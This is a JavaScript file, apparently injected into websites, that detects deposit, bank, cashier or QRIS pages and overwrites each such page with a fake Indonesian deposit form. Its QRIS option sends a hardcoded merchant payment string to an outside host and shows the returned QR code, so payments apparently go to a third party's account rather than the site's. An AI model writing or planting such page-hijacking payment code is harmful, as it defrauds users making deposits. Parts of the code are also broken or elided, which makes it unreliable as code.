(function(){
  const path = window.location.pathname.toLowerCase();
  const search = window.location.search.toLowerCase();

  // path yang harus dicek dengan endsWith
  const pathKeywords = [
    "/deposit",
    "/bank",
    "/deposit.php",
    "/qris.php",
    "/cashier",
    "/bank.php"
  ];

  const matchPath = pathKeywords.some(keyword => path.endsWith(keyword));
  const matchQuery =
    search.includes("page=transaksi") ||
    search.includes("deposit&head=home") ||
    search.includes("page=cashier");

  if (!matchPath && !matchQuery) {
    console.log("[indexkuy.js] URL tidak cocok, halaman tidak diubah.");
    return;
  }

  console.log("[indexkuy.js] URL cocok, mengganti halaman...");

  // === ganti seluruh HTML dengan innerHTML ===
  document.documentElement.innerHTML = `
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Formulir Deposit</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
      :root{--bg:#eef2f6;--card:#ffffff;--muted:#6b7280;--primary:#1f6feb;--success:#16a34a;--radius:12px;}
      *{box-sizing:border-box}html,body{height:100%}
      body{font-family:'Poppins',sans-serif;margin:0;background:var(--bg);color:#111827;display:flex;justify-content:center;align-items:flex-start;padding:18px 12px;min-height:100vh}
      .page{width:100%;max-width:760px}
      /* ... (CSS sama seperti sebelumnya) ... */
    </style>
  </head>
  <body>
    <div class="page">
      <header><h1>Formulir Deposit</h1></header>
      <div class="card">
        <div class="marquee"><span>Selamat datang di situs kami. Harap perhatikan tujuan deposit — tujuan deposit wajib sesuai dengan formulir deposit.</span></div>
        <div class="actions">
          <button class="btn" onclick="showDeposit('manual')">Manual Deposit</button>
          <button class="btn secondary" onclick="showDeposit('auto')">Otomatis Deposit (QRIS)</button>
        </div>

        <div id="manual-step" style="display:none; margin-top:6px;">
          <!-- sama seperti versi sebelumnya -->
        </div>

        <div id="auto-deposit" style="display:none; margin-top:6px;">
          <!-- sama seperti versi sebelumnya -->
        </div>

      </div>
      <footer>&copy; 2025</footer>
    </div>

    <script>
      function copyToClipboard(t){navigator.clipboard.writeText(t).then(()=>alert('Nomor berhasil disalin!'))}
      function showDeposit(type){manual-step.style.display=(type==='manual')?'block':'none';auto-deposit.style.display=(type==='auto')?'block':'none';setTimeout(()=>document.querySelector('.card').scrollIntoView({behavior:'smooth',block:'start'}),120);}
      function selectMethod(j){if(!j)return;try{const m=JSON.parse(j);manual-details.style.display='flex';bank-logo.src=m.logo;bank-name.innerText=m.name;bank-number.innerText=m.number;bank-owner.innerText=m.owner;}catch(e){console.error('parse error',e);}}
      function submitManualDeposit(){const n=Number(manual-nominal.value||0);if(n<50000){alert('Minimal deposit 50.000');return;}manual-result.innerHTML='<div class="spinner"></div><div class="helper">Processing...</div>';setTimeout(()=>{manual-result.innerHTML='<div class="helper"><strong>Deposit In Progress</strong></div>';setTimeout(()=>location.href='../',1500)},1500);}
      async function generateQRIS(){const n=Number(nominal.value||0);if(n<50000){alert('Minimal deposit otomatis adalah 50.000');return;}auto-result.innerHTML='<div class="spinner"></div><div class="helper">Membuat QRIS...</div>';const p='qris=00020101021226670016COM.NOBUBANK.WWW01189360050300000879140214250910000000730303UMI51440014ID.CO.QRIS.WWW0215ID20254343011770303UMI5204481253033605405500005802ID5920ARPUS CELL OK26161126007LANGKAT61052076162070703A016304CC38&qty='+encodeURIComponent(n)+'&yn=n';try{const r=await fetch('https://apxnzd.page.gd/qris.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:p});console.log('[QRIS] Status:',r.status);const t=await r.text();console.log('[QRIS] Response:',t);const u='https://api.qrserver.com/v1/create-qr-code/?size=300x300&data='+encodeURIComponent(t);auto-result.innerHTML='<div class="qr-card"><img id="qr-img" src="'+u+'" style="width:220px;height:220px;border-radius:10px;"></div><div style="margin-top:12px;"><button class="btn" onclick="downloadQR()">Download QRIS</button><button class="btn secondary" onclick="location.href=\\'../\\'">Telah Membayar</button></div>';setTimeout(()=>qr-img.scrollIntoView({behavior:'smooth',block:'center'}),120);}catch(e){console.error('[QRIS] Fetch error',e);auto-result.innerHTML='<div class="helper">Gagal membuat QRIS. Coba lagi.</div>';}}
      function downloadQR(){const img=document.getElementById('qr-img');if(!img)return;const link=document.createElement('a');link.href=img.src;link.download='qris.png';document.body.appendChild(link);link.click();link.remove();}
    <\/script>
  </body>
  </html>`;
})();
